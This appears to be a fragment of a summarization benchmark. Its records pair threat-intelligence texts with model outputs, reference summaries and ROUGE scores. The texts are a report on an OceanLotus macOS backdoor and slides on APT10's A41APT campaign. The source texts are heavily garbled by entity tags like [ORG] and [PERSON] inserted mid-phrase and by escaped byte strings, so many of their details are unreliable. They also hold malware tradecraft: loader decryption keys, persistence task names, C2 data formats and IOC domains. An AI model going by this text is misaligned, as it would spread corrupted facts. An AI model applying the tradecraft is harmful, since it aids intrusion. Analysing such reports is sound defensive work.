\\xa7\\xf1\\xd9*\\x82\\xc8\\xd8\\xfe4137674062B3226FE630C24F7DE1021E\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 ~/Library / Preferences/.\ufb01les   The server then sends this command with an ephemeral key shortly after it sends the 0x2170272 command . The client gathers all the data seen in Figure [CARDINAL] 11 , encrypts it with the key provided by the server and sends it back . [CARDINAL] One thing to note is the [PERSON] Base64 string that is sent in this packet . This string is static in the binary and does not change , which may be indicative of a marker for campaign or version identi\ufb01cation .   \\x00\\x00\\x004137674062B3226FE630C24F7DE1021E\\xe9\\x0f\\x00\\x00\\x00Mac 10.X.X\\xb6\\x03\\x00\\x00 [ORG] \\x00username\\t\\x00\\x00\\x00localhost\\x18\\x00\\x00\\x00Ze0pXcpfbqbS4wD0eS / LVQ==\\xb6\\xbc\\x1cY\\x00\\x00\\x00\\x00M\\x00\\x00\\x00 / Users / username / [PERSON] Library / OpenSSL/0000- ABCDEF01 - 23456789ABCDEF01 - 23456789/ servicessl\\x8b\\xbc\\x1cY\\x00\\x00\\x00\\x00\\x17\\x00\\x00\\x00en0 : AA : BB : CC : DD : EE : FF[\\x00\\x00\\x00lo0 : fe80::1\\nlo0 : fe80::aaaa : bbbb : cccc:111 : \\x05\\x01\\x00\\x00f\\x00\\x00\\x00Model ID : iMac8,1\\nCPU : Intel(R ) Core(TM)2 2.40GHz\\nMemory:4.00\\nSerial No : XXXXXXXXXXX\\x00\\x00\\x00\\x00 Not highlighted in Figure [CARDINAL] 11 but also included in this packet is the kernel boot time which may be used by the C2 server to help determine if the backdoor is being run in a sandbox environment . These commands load a dynamic library using dlopen ( ) and obtains a function pointer to execute within that shared library using dlsym ( ) . Unfortunately , we do not know which dynamic libraries or functions are used for each command since these are server supplied and we were not able to capture any communication that used these commands . However , we can postulate that since the parameters to the functions have the same number of arguments with the \ufb01rst being a fairly large constant   similar to the command constants , ( see Figure [CARDINAL] 12 ) and the backdoor has a function for receiving \ufb01les , it is possible that these functions correspond to a   shared library that the server uploads to the victim host . This means that additional functionality can be added to this backdoor by loading modules directly from the C2 server . Figure Most macOS malware in the wild [DATE] today are not very complex , but threat actors have been quickly improving their tradecraft . The increased level of sophistication and complexity may be indicative of increased targeting of macOS hosts looking to the future . With this [ORG] OceanLotus attack in combination with recent macOS versions of the [ORG] Sofacy group \u2019s toolset , we have now observed multiple espionage motivated threat actors targeting macOS . It is imperative that the same types of strong security practices and policies organizations use to defend Windows devices are applied universally to include macOS devices as well . [ORG] Apple has already updated the macOS protection systems to address this variant of [ORG] OceanLotus . [ORG] Palo [ORG] Alto [ORG] Networks customers are protected and may learn more via the following : Samples are classi\ufb01ed as malicious by [ORG] WildFire   [ORG] Domains and [ORG] IPs have been classi\ufb01ed as malicious and [ORG] IPS signatures generated   [ORG] AutoFocus users may learn more via the [ORG] OceanLotus tagIndicators of [PRODUCT] Compromise [PRODUCT] Hashes call[.]raidstore[.]org technology[.]macosevents[.]com press[.]infomapress[.]com [CARDINAL] 24h[.]centralstatus[.]net /Library / LaunchDaemons / com.apple.mtmfsd.plist /Library / TimeMachine / bin / mtmfs /Library / Preferences/.\ufb01les UID ~/Library / LaunchAgents / com.apple.openssl.plist ~/Library / OpenSSL/0000-<segmented [ORG] MD5 hash>/servicessl ~/Library / Preferences/.\ufb01les Got something to say?Leave a comment [GPE] Notify e - mailName ( [PERSON] required)Email ( required)WebsiteSUBMITSUBSCRIBE TO [PERSON] NEWSLETTERSEmailCOMPANY [PERSON] Report a [ORG] VulnerabilityLEGAL [ORG] NOTICES [ORG] Privacy [ORG] Policy [ORG] Terms of [ORG] UseACCOUNT [ORG] Manage SubscriptionSUBSCRIBE \u00a9 2016 [ORG] Palo [ORG] Alto [ORG] Networks , [ORG] Inc. All rights reserved . SALES > 866.320.4788SEE A DEMOTAKE A TEST DRIVE", "generated_text": "the new version; OceanLotus; Vietnam; the attackers; the malware; a zip file; the user; a Microsoft Word document; the Word document; a decoy document; execution; the decoy document; the shellcode; a shellcode remote command; the command; the user; the command; Control; execution; persistence; the decoy document; the user; the malware; a decoy document; new backdoors; the process; a decoy document; the decoy document; a command; the user; the macOS domain; the malware; similarities; the OceanLotus sample; May 2015; a range; code changes; compromise.", "ref_text": "<START-1>The document describes a new backdoor malware called OceanLotus that has been found targeting MacOS devices, primarily in Vietnam. OceanLotus is an advanced and sophisticated piece of malware that has improved over previous versions in several ways: It uses a decoy Word document to disguise itself when executed. This tricks the user into thinking they opened a normal document. It establishes persistence in a clever way, storing itself in locations that mimic real MacOS applications and processes. This helps it blend in and avoid detection. It does not use suspicious command line utilities, making static analysis more difficult. It uses a custom encrypted network protocol to communicate with its command and control server, not standard web protocols. The encryption keys change per session. It can receive additional modules from the server, expanding its functionality dynamically. It exfiltrates system information from the infected machine back to the server, including username, network information, model details, etc. The authors appear to be espionage motivated and targeting MacOS specifically as it becomes more widely used. The malware continues to avoid detection very successfully. The report concludes that MacOS is increasingly being targeted and strong security practices need to be applied to it like other platforms. Defenses have been updated to detect this threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3644859813084112, "gpt3/lexical/rouge_rouge2": 0.06572769953051644, "gpt3/lexical/rouge_rougeL": 0.1822429906542056, "gpt3/lexical/rouge_rougeLsum": 0.1822429906542056, "gpt3_generated_text": ["This article discusses a new version of the OceanLotus backdoor found in the WildFire cloud analysis platform, which is targeted towards victims in Vietnam. Despite being in the wild for a year, the backdoor still maintains a low antivirus detection rate. The backdoor is distributed in a zip file, likely via email attachment, and appears as a Microsoft Word document. When the user opens the document, the Trojan executes and launches Word to display a decoy document, masking the execution of the malware. The backdoor uses a password-protected Word document to achieve this obfuscation. The persistence mechanism for this version of the backdoor remains largely the same as the previous version, creating a launch agent that runs when the victim host starts up. The malware also copies itself to different locations based on the user's UID. The new version of the backdoor shows improvements such as the use of a decoy document, elimination of command line utilities, a robust string encoding mechanism, custom binary protocol traffic with encryption, and a modularized backdoor. The article mentions similarities to a previous OceanLotus sample discovered in May 2015, but notes a variety of improvements and code changes since then. Overall, this new version of the OceanLotus backdoor demonstrates the attackers' ability to evolve and maintain persistence in the macOS domain."]}, {"split_name": "val", "sample_id": "val_12", "prompt_text": "Extract the keywords: APT10 : Tracking down the stealth activity of [ORG] the [ORG] A41APT [ORG] campaignSuguru [ORG] Ishimaru [ORG] / [ORG] Yusuke [ORG] Niwa [ORG] / [PERSON] Charles [PERSON] Li / [PERSON] Motohiko [PERSON] Sato / Hajime Yanagishita2020/02/25 GReAT Ideas Green tea editionPresenter / CoauthorCharles Li Team T5 Chief Analyst of [ORG] TeamT5Hajime [ORG] Yanagishita [ORG] Macnica [ORG] Networks [ORG] Security [ORG] ResearcherYusuke [ORG] Niwa [ORG] ITOCHU [ORG] Corporation . ITCCERT Cyber Security ResearcherMotohiko Sato ITOCHU Corporation . ITCCERT Sr . Cyber Security ResearcherSuguru Ishimaru [PERSON] Kaspersky [PERSON] GReAT [PERSON] Malware Researcher2Agenda1 . [ORG] Campaign [ORG] Overview2 . [PERSON] Malware [PERSON] Analysis3 . Characteristics of [PERSON] Intrusion4 . Threat Actor \u2019s Infrastructure5 . Consideration of Threat Actor \u2019s Attribution6 . Summary3\uff11\uff0eA41APT Campaign OverviewA41APT Campaign OverviewPeriod of Activity : [DATE] March [DATE] 2019 to January 2021Target : [GPE] Japan ( [NORP] Japanese companies including overseas [ORG] branches)Infection [ORG] Vector : SSL - VPN abuse ( Could not observed spear - phishing)Implants : DESLoader , SodaMaster , [ORG] P8RAT and FYAntiLoader etc . Characteristics : Very tough to detect attacker \u2019s intrusionWe call this threat campaign A41APT from the hostname feature \u201c [ORG] DESKTOP - A41UVJV \u201d that is continuously used during the initial intrusion.5Public [PERSON] info\u3010\u30ec\u30dd\u30fc\u30c8\u3011Microsoft\u306e\u30c7\u30b8\u30bf\u30eb\u30d5\u30a1\u30a4\u30eb\u3092 [PERSON] \u3059\u308b\u300cSigLoader\u300d\u306b\u3088\u308b\u3092 [ 1]Japan - Linked Organizations Targeted in Long [GPE] - Running and Sophisticated Attack Campaign[2]@Int2e _ \u2019s tweet[3]Attacks Exploiting Vulnerabilities in Pulse Connect Secure[4]6\uff12\uff0eMalware Analysis\uff12\uff0e [ORG] Malware Analysis1.DESLoader1.Payloads of [LAW] DESLoader\u2022 [LAW] SodaMaster [LAW] \u2022 [LAW] P8RAT [LAW] \u2022 [LAW] FYAntiLoader [LAW] \u21d2 .NET Loader(ConfuserEx v1.0.0 ) \u21d2 xRAT82 - 1\uff0eDESLoaderAka . [PERSON] SigLoader , [PERSON] Ecipekac , [ORG] HEAVYHAND\uf071 [ORG] Unique multi - layer loader for payloadspolicytool.exeLegitimate EXE\uf071 Use 4 files in the same directory\uf071 DLL Side - Loading\uf071 DLLs contains encrypted shellcode ofLayer II and IV loader.\uf071 [PERSON] Layer [PERSON] II , [ORG] III , IV loaders and payload arevac.dllfileless implants . Layer I loader for side - loadingjli.dllDLL contains encrypted shellcode : [PERSON] Layer [PERSON] II loaderDLL contains encrypted shellcode : [PERSON] Layer [PERSON] IV loaderpcasvc.dll9Example of DESLoader 's payload loading flowside - loadingloaddecryptreflective dll injectionfileless implantspolicytool.exe [ORG] Legitimate [ORG] EXEjli.dllLayer [ORG] Ivac.dllloadshellcode1 [ORG] Layer IIembedded DLL1Layer [ORG] IIIdecryptreflective dll injectionpcasvc.dllshellcode2Layer [PERSON] IVembedded DLL2PayloadLayer I : junk codes are found using OutputDebugStringA ( ) , _ time64 ( ) , rand ( ) , srand ( ) for anti - reversingJunk code10jli.dll : Layer I LoaderMultiple algorithms ( XOR , DES , [ORG] AES and [ORG] RSA ) are implemented , and the order of using them is configured . It read encrypted data in vac.dll from the end of data till configured size and decrypt.loaddecryptjli.dllLayer Ivac.dllMZPESection table + Section 1 \u2026 NEmbedded dataDefined crypto algorithmsshellcode1 [PERSON] Layer [PERSON] II skipped [CARDINAL] 1 . XORkey = 0x9F skipped [CARDINAL] 2 . AES ( CBC mode)key = 83H4uREKfFClDH8ziYTH8xsBYa32p3wl IV = 83H4uREKfFClDH8z skipped [CARDINAL] 11shellcode1 : Layer II LoaderLayer II Loader checks magic_bytes \" ecipekac\"(or \u201c [CARDINAL] 9F [CARDINAL] 8F 7F [CARDINAL] 6F \u201d or \u201c BF AF BF AF \u201d ) . Then , it reconstructs and loads each part of the embedded DLL1 in the correct order of [ORG] PE format for reflective [ORG] DLL injection.reflective dll injectionshellcode1 [PERSON] Layer [PERSON] IIshellcodeecipekac [PERSON] Size of buf Size of codeSection table 0x00c050x39a1d0x39b250x000000x000E00x001E80x010000xXXXXXembedded DLL1Layer [ORG] IIIMZ [ORG] PESection [ORG] tableSection [ORG] 1Section [ORG] N12embedded [ORG] PE1 : Layer III LoaderLayer III Loader is similar to [ORG] Layer [ORG] I [ORG] Loader . The sequence of algorithms is in the reverse order compared to the layer I Loader . The hardcoded keys are also different respectively.loaddecrypt1.AES key = [PERSON] K4jcj02QSLWp8lK9gMK9h7W0L9iB2eEW , IV = [PERSON] K4jcj02QSLWp8lK9shellcode2Layer IVembedded DLL1Layer IIIDefined crypto algorithmspcasvc.dllMZPESection table + [DATE] Section [DATE] 1 \u2026 [LOC] NEmbedded [LOC] data2.XOR key = [CARDINAL] 0x5E13shellcode2 : Layer IV LoaderThree different types of shellcode were confirmed as [PERSON] Layer [PERSON] IV loader:1 . Similar to [PERSON] Layer [PERSON] II shellcode for [PRODUCT] P8RAT and [ORG] FYAnti loader2 . Cobalt strike \u2019s stager shellcodereflective dll injection3 . [PERSON] Shellcode dedicated for SodaMastershellcode2Layer [PERSON] IVembedded DLL2Payloadoffsetdatadescription0x00090 90 90 90 90 90 90 90magic bytes for [ORG] Identification , this is used for comparision before data [ORG] processing0x0080x11600Size of encrypted data , only this value ( size ) is observedshellcode2 Layer IV for SodaMaster contains data structure0x00C0x01CA9 [CARDINAL] 5B [CARDINAL] 7B 84 9C CB CF E8 B6 79 F1 9F [CARDINAL] 05 B6 2B FEC7 36 7E 93 D3 07 1E 86 23 75 10 49 [ORG] C8 AD 01 9F [ skipped]16 bytes RC4 key ( each sample has different key)Encrypted SodaMaster payload with [PRODUCT] RC414DESLoader TimeLineThe timeline of DESLoader based on compilation time . Also shown filename and its payloads . ( + Cobalt Strike \u2019s stager)jli.dllWTSAPI32.DLLNETAPI32.DLLSECUR32.dllDBUS-1 - 3.DLLVMTOOLS.DLLSodaMasterjli.dllvmtools.dlljli.dllJLI.dlljli.dllLIBEAY32.DLLsbiedll.dllCobalt Strike \u2019s [ORG] stagerdbus-1-3.dllSBIEDLL.DLLDBUS-1-3.DLLGLIB-2.0.DLLP8RATuxtheme.dlljli.dllkbb.dllkbb.dllvmtools.dllsbiedll.dllJLI.DLLjli.dllvmtools.dll jli.dllFYAntiCCFIPC64.DLLOct 2019Dec 2019May 2020Jun 2020Jul [TIME] 2020Sep [TIME] 2020Oct 2020Dec 2020152 - 2\uff0ePayloads of DESLoader1 . FYAntiLoader\u21d2 .NET Loader(ConfuserEx v1.0.0 ) \u21d2 xRAT16SodaMasterAka . DelfsCake , dfls , [ORG] DARKTOWN\uf071 [ORG] One of DESLoader 's [ORG] payloads\uf071 [ORG] Fileless RAT(x64 [ORG] / x86)\uf071 [ORG] Command identifiers are d , f , l and s\uf071 Check VM environment from the followingregistry value \uf0fcHKCR\\Applications\\VMwareHostOpen.exe17SodaMaster\uf071 [ORG] Mutex value = reverse order ofCRC32 calculated from hardcoded base64 string + 12 bytes\uf071 Initial C2 communication data isencrypted with [NORP] RSA.\uf071 The [ORG] RSA key is hardcoded base64key_blob and data contains randomly generated RC4 key\uf071 Further communication data isencrypted with RC4base64(RSA key ) + 12bytes dataEncrypted using [ORG] RSA [CARDINAL] keyCRC320x8d01ca9fMutex = [CARDINAL] 9FCA018DUser RC4keyRC4 encryptionSodaMasterC2 server18P8RATAka . GreetCake , HEAVYPOT\uf071 One of DESLoader 's payloads\uf071 x64 fileless RAT\uf071 [CARDINAL] 10 backdoor commands.\uf071 [ORG] Main feature looks command [CARDINAL] 301:\uf0fc Execution of secondary PEbased payload downloaded into [ORG] memory\uf071 [ORG] P8RAT checks [ORG] VMware and VirtualBox\uf0fc\uf0fcvboxservice.exevmtools.exe19P8RAT backdoor commandsDescription2020 - 03 - 302020 - 08 - 262020 - 12 - 14Compilation time of P8RATClosing socketCreating a thread for executing / loading of a downloaded PENo functionalitySending randomly generated dataExecuting / loading downloaded [ORG] PE / shellcodeSetting value of \u201c [WORK_OF_ART] Set [WORK_OF_ART] Online [WORK_OF_ART] Time \u201d , and the string of the setting value was removed from the P8RAT which was built on [DATE] 2020 [DATE] - 08 [DATE] - 26.EnableEnableEnableEnableEnableEnableEnableEnableEnableEnableRemovedRemovedEnableEnableRemovedRemovedEnableEnableSetting value of \u201c [WORK_OF_ART] Set [WORK_OF_ART] Reconnect [WORK_OF_ART] TimeOut \u201d , and the string of the setting value was removed from the P8RAT which was built on [DATE] 2020 [DATE] - 08 [DATE] - 26.EnableEnableEnableSetting value of \u201c [WORK_OF_ART] Set [WORK_OF_ART] Reconnect times \u201d , and the string of the setting value was removed from the P8RAT which was built on [DATE] 2020 [DATE] - 08 [DATE] - 26.EnableEnableEnableSetting value of \u201c Set Sleep time \u201d , and the string of the setting value was removed from the P8RAT which was built on [CARDINAL] 2020- 08 - 26.EnableEnableEnableCreating thread for executing downloaded shellcode was implemented from P8RAT which was built on [DATE] 2020 [DATE] - 12 [DATE] - 14.Not implementedNot implementedEnable20cmd300301302303304305306307308309FYAntiLoaderAka . DILLJUICE stage2\uf071 One of DESLoader 's [ORG] payloads\uf071 [ORG] Fileless type multi - layer loader module\uf071 Provocative Export function [PERSON] name\uf071 [PERSON] Loads .NET Loader using CppHostCLR\uf071 Contains .NET Loader packedwith ConfuserEx v1.0.0\uf071 Finally , [GPE] Payload is xRAT ( QuasarRAT)21Example of FYAntiLoader 's payload loading flowside - loadingloaddecryptreflectivedll injectionfileless implantsFYAntiusoclient.exeLegitimate EXECCFIPC64.dllLayer Imsftedit.prf.cooloadshellcode1 Layer IIembedded DLL1Layer [ORG] IIIdecryptreflective dll injectionCppHostCLRloaddecryptmsdtcuiu.adi.wdbshellcode2Layer [PERSON] IVembedded [PERSON] DLL2.NET loaderweb_lowtrust.config.uninstallxRATFYAntiLooking for specific directory and search file with condition , then read file and decrypt payload22xRAT ( payload of FYAntiLoader)VERSION Environment . SpecialFolder . ApplicationData Quasar Client Startup none23Obfuscated configuration data decrypts using base64 + AES CFB mode\uff13\uff0eCharacteristics of [ORG] IntrusionIntrusion method in A41APT campaignInitial [ORG] IntrusionInternal [ORG] Recon . Lateral MovementPersistence ofmalwareC2CommunicationTrace [ORG] RemovalPenetration via SSL - VPN using vulnerabilities or stolen credentialsPerform a port scan to search for open RDP or [PRODUCT] SMB port . Then , connect to RDP with an administrator account . Persistence by scheduled task registration to execute the legitimate [FAC] PECommunicate with [CARDINAL] C2 server via DESLoader \u2019s payload or [ORG] PowerShell remotingDelete the event log after communication with C2 is finished . Scheduled task registrationEvent log deletionServer \u30fbIn [CARDINAL] MemoryDESLoaderPayloadORAD ServerCredential DumpingLaptopLegitimate [PERSON] PEPowerShellC2 [PERSON] Server25*We have also observed cases where traces have been removed from other compromised servers as well . Characteristics of Compromise1.Initial intrusion using SSL [ORG] - VPN [ORG] products2 . Network scanning and credential theft3 . [ORG] PowerShell remoting to remove event logs4 . Persistence of malware by scheduled task26\uff13-\uff11\uff0e Initial intrusion via SSL - VPN ( e.g. session hijacking)\u2022\u2022\u2022In [DATE] October [DATE] 2019 , an attacker used the hostname [ORG] DESKTOP - A41UVJV to hijack sessions to enter the internal network via SSL - VPN product , [PERSON] Pulse [PERSON] Secure . [PERSON] JPCERT also reported a similar attack targeting SSL - VPN [ [CARDINAL] 4].In some cases , attackers used credentials that they had stolen in the past intrusion.27\uff13-2\uff0e Network scanning and credential theftNetwork scanning and [ORG] RDPCredential theft \u25aa After the intrusion by SSL [ORG] - VPN , performinternal network scanning to find open port [ORG] RDP ( [CARDINAL] 3389 / TCP ) and [PRODUCT] SMB ( [CARDINAL] 445 / TCP ) . \u25aa Use an administrator account to deploy [ORG] RDPto servers with free RDP . \u25aa Run csvde.exe , a [ORG] CSV export command linetool provided by [ORG] Microsoft . \u25aa [PERSON] Execute [PERSON] AdFind provided by joeware . \u25aa Dump of SYSTEM / SECURITY / [ORG] SAM hive , etc.e.g . server types that are frequentlycompromised by RDPAD serverFile serverAnti Virus management serverBackup serverPrint serverFAX serverurl url pro / windows - server-2012 - r2 - and-2012 / cc732101(v = ws.11)28\uff13-3\uff0e [ORG] PowerShell remoting to delete event [ORG] logs\u2022 [ORG] Event log : the end of [LAW] a [LAW] PowerShellremoting [LAW] session\u2022 [LAW] Windows PowerShell.evtxEID : 403\u2022 The \" C2 address \" and the \" * .nls filename \" are changed , but the rest is the same\u21d2 probably common tools execution29\uff13-\uff14\uff0ePersistence of malware by scheduled task \u25aa Registered a task scheduler that executes a legitimate executable file that loads DESLoaderevery 15 minutes. \u25aa It is unlikely that the same scheduled task name is created on the compromised hosts.30e.g . Improperly registered scheduled tasks observed in the pastScheduled Tasks\\Microsoft\\Windows\\Sysmain\\HybridDriveCachePrepopulate\\Microsoft\\Windows\\Shell\\FamilySafetyMonitor\\Microsoft\\Windows\\NetworkAccessProtection\\NAPStatus UI\\Microsoft\\Windows\\SideShow\\AutoWake\\Microsoft\\Windows\\SystemRestore\\SR\\Microsoft\\Windows\\Shell\\FamilySafetyUpload\\Microsoft\\Windows\\File Classification Infrastructure\\Property Definition Sync\\Microsoft\\Windows\\UpdateOrchestrator\\Refresh Settings\\Microsoft\\Windows\\WindowsUpdate\\AUSessionConnect\\Microsoft\\Windows\\Shell\\WindowsParentalControls\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Retry Scan\\Microsoft\\Windows\\LanguageComponentsInstaller\\ReconcileLanguageResources\\Microsoft\\Windows\\Setup\\EOSNotify\\Microsoft\\Windows\\SkyDrive\\Idle Sync Maintenance TaskPE nameHybridDrive.exewpcmon.exeNAPStatus.exeAutoWake.exesrtasks.exeFamilySafety.exeDefinitionSync.exeusoclient.exeAUSession.exeParentalControls.exeusoclient.exeDiagPackage.exeEOSNotify.exeIdleSync.exe31\uff14\uff0eThreat Actor \u2019s InfrastructureThreat Actor \u2019s Infrastructure1 . The hostname used for the intrusion via SSL [ORG] - VPN2 . Characteristics of the C2 infrastructure33Hostname used for the initial intrusion via SSL - VPN \u25aa Tendency to use distinctive hostnames and attempt intrusionswhile changing [ORG] IP addresses \u2714 Host names used in breaches observed in the pastHostnameObservation TimeDESKTOP - A41UVJV2019/10 - 2020/01dellemc_N1548P2020/04 - 2020/05DESKTOP - LHC2KTF2020/12DESKTOP - O2KM1VL2019/10 , 2020/12DESKTOP - V24F9JL2020/12 \u25aa [PERSON] Tendency to use an [ORG] IP for intrusion that is different from the [CARDINAL] C2 server \u2019s IP34Characteristics of the [CARDINAL] C2 infrastructure \u25aa For C2 , there is a tendency to use [ORG] IP addresses and not to use domains . \u25aa From the observed C2 IP addresses , there is little bias toward country and AS , and weobserved that there is a tendency not to reuse [ORG] IP addresses repeatedly.35\uff15\uff0eConsideration of [ORG] Threat Actor \u2019s [ORG] AttributionConsiderations for attribution of A41APT1 . Relevance to APT102 . Relevance to BlackTech37\uff11\uff0eRelevance to APT10 \u25aa [CARDINAL] Two ways linked to APT10 : \u25aa Confirmed the existence of an early version ofSodaMaster ( x86 ) in [DATE] March [DATE] 2019 , which was involved in an attack against [GPE] Turkey and attributed to APT10 ( mentioned [ 5 ] ) xRAT observed in A41APT campaign has common TTPs with [ORG] BlackBerry [ORG] Cylance reports in [DATE] 2019 was confirmed [ 6]. \u25aa ShellCodeloadCommon TTPs - F**kYouAnti export - Look for payloads under\u201cC:\\Windows\\Microsoft . Net\u201dCommon TTPsRun dll payloadSodaMasterxRAT / QuasarRATconnectMenuPass / QuasarRATBackdoor [ORG] ReportRun [PERSON] Shellcode payloadrare - coisns[.]comAttributeAPT10*Compared to SodaMaster in [DATE] 2020 , [CARDINAL] only [CARDINAL] two commands are supported . Used in attackAttackTurkish [ORG] Victim38\uff12\uff0eRelevance to BlackTechSodaMasterTSCookie \u25aa Identified common features between SodaMaster and [ORG] TSCookie [ 7 ] . \u25aa The same information is collected from the compromised host in the \u2013 Current process ID \u25aa Observed existence of [CARDINAL] two malware , SodaMaster and [ORG] TSCookie , on multiple compromised hosts39\uff16\uff0eSummaryWrap up\uff1aA41APT [ORG] Campaign \u25aa Intrusion via SSL - VPNADVERSARY \u25aa Heavy usage of RDP for lateralmovement ( mainly servers ) \u25aa Abusing [ORG] DLL [ORG] - Sideloading \u25aa [ORG] Remove tracesCAPABILITIES \u25aa Targeting [NORP] Japanese companiesincluding overseas branches \u25aa Wide range of industries such asmanufacturingVICTIMS \u25aa Strong association with APT10 \u25aa Potential relevance to BlackTechINFRASTRUCTURE \u25aa [ORG] Heavy usage of [ORG] IP addresses for C2(no domain usage ) \u25aa Less reuse of [ORG] IP addresses for C2 \u25aa IP for an initial intrusion and C2 IP are [PERSON] different.41Wrap up \uff1a TTPs ~MITRE ATT&CK Mapping ~ TacticsInitial AccessExecutionTechniquesExternal Remote Services ( T1133 ) : Intrusion via SSL - VPN using vulnerabilities or stolen credentialsCommand and Scripting Interpreter : PowerShell ( T1059.001 ) [PERSON] Base64 obfuscated [ORG] PowerShell commands ( delete event log ) Windows Management Instrumentation ( T1047 ) : WMIC collects services for security productsPersistenceScheduled [PRODUCT] Task [PRODUCT] / Job : [PRODUCT] Scheduled [PRODUCT] Task ( T1053.005 ) : Privilege EscalationHijack Execution Flow : [ORG] DLL [ORG] Search [ORG] Order [ORG] Hijacking ( [ORG] T1574.001)Defense [ORG] EvasionCredential AccessDiscoveryDeobfuscate [ORG] / Decode [ORG] Files or information ( T1140 ) Indicator Removal on Host : Clear Windows Event Logs ( T1070.001 ) Hijack Execution Flow : [ORG] DLL [ORG] Search [ORG] Order [ORG] Hijacking ( T1574.001)OS Credential Dumping : Security Account Manager ( T1003.002 ) OS Credential Dumping : [PERSON] NTDS ( T1003.003)Account [PRODUCT] Discovery : Domain Account ( [GPE] T1087.002 ) Domain Trust Discovery ( [ORG] T1482 ) Software Discovery : Security Software Discovery ( T1518.001)Lateral MovementRemote Services : Remote Desktop Protocol ( T1021.001)CollectionArchive Collected Data : Archive via [LAW] Utility ( T1560.001 ) : Compression by [GPE] WinRARCommand and ControlApplication Layer Protocol : Web Protocols ( T1071.001 ) Data Encoding : Non [ORG] - Standard [ORG] Encoding ( T1132.002)42Wrap up \uff1a Features of this campaign \u2714 Targeting the kryptonite of [ORG] EDR / [ORG] FSA detection\u2022 [ORG] Malware is written on the disk by the attacker 's manual operation via SSL - VPN instead of malware - originated intrusion from Spear phishing email ( legitimate file , loader , encrypted file)\u2022Intrusion from group affiliates , including overseas [PERSON] companies\u2022 [PERSON] Malware is mostly placed on servers , and the number of compromised servers are very small.\u2022 Most of the malware detected in the same period have different C2 addresses , so there is little tendencyto use the same samples . \u2714 After the intrusion , some rough operations were seen.\u2022 Heavy usage of network discovery using [PERSON] RDP\u2022 [PERSON] Common traces deletion method of event [GPE] logs\u2022 Recorded attacker 's hostname in event log43Examples of countermeasures against this campaignSSL - VPNGovernance\uff08Overseas / affilates\uff09Implementation of [GPE] MFA\u2022 \u2022 [NORP] Patch adaptation operation \u2022 [ORG] MonitoringEnd [ORG] UserAdditional threat [PRODUCT] visibility\u2022 [PRODUCT] \u2022Network [PRODUCT] Monitor by [ORG] NTA [ORG] Strengthen security measures for servers Hunting stealthy attack by using [ORG] EDR / FSA Leverage Yara rule to detect loader or payload on memory\u2022\u2022 \u2022Framework for sharing information ( Incident , Threat Intel and security situation ) Apply same security level [ORG] Apply same level of detection in each intrusion methodAdditional [PRODUCT] MonitoringAudit authentication attemp of administrator account ( success / failure ) Monitor deletion of Windows event log Monitor login from host that is not in list of organization asset Monitor SSL - VPN log for suspicious login from unknown host ( e.g. hostname is not in organization asset ) [PERSON] Strengthen [PERSON] Monitoring for [PERSON] AuthenticationVendor ( SOC)\u2022 Talk with end user to know white - list ( username , hostname , [ORG] IP address and date / time ) ofauthentication and give proactive alert to end user44Examples of countermeasures against this campaign ( Based on intrusion [ORG] method)Initial [ORG] IntrusionInternal [ORG] Recon . Lateral MovementPersistence ofmalwareC2 [ORG] CommunicationTrace Removal- Implementation of MFA - Patch adaptation operation - Monitor suspicious logins from overseas- NW monitoring by [ORG] NTA [ORG] - [ORG] Strengthen security measures for servers ( [ORG] EDR [ORG] / [ORG] FSA etc . ) - Monitoring of administrator - Suspicious login monitoring from hosts outside of asset management- Monitor the creation of suspicious scheduled task events.- Payload detection by Yara - C2 identification and blocking by malware analysis- Monitor for traces of suspicious event log deletions.- Identify and block C2 by traces of suspicious [ORG] PowerShell remoting in event logsScheduled task registrationEvent log deletionPatch applicationoperationMFAMonitoringServer \u30fbIn MemoryEvent log [ORG] monitoringDESLoaderpayloadsORAD serverLaptopLegitimate [GPE] PEMonitoringMonitoringPowerShellPayloads detectionby [NORP] YaraC245At the end \uf071 A41APT campaign is very stealthy and difficult to detect , but it is not undetectable.\uf071 The compromised target has shifted from endpoint to server , and the intrusion route has alsoshifted from spear phishing to abusing SSL - VPN . Security measures need to be reviewed inyour organization to respond to change in attack method.\uf071 By refining [DATE] daily security operations and thoroughly reviewing the security holes in eachorganization 's environment , it may be possible to detect and protect attacks from even smallanomalies.46Reference1 . \u3010 \u30ec\u30dd\u30fc\u30c8\u3011Microsoft\u306e\u30c7\u30b8\u30bf\u30eb\u30d5\u30a1\u30a4\u30eb\u3092\u3059\u308b\u300cSigLoader\u300d\u306b\u3088\u308b\u3092url [WORK_OF_ART] Organizations [WORK_OF_ART] Targeted in Long [GPE] - Running [GPE] and Sophisticated Attack Campaign url Attacks Exploiting Vulnerabilities in [ORG] Pulse [ORG] Connect [ORG] Secureurl [ORG] 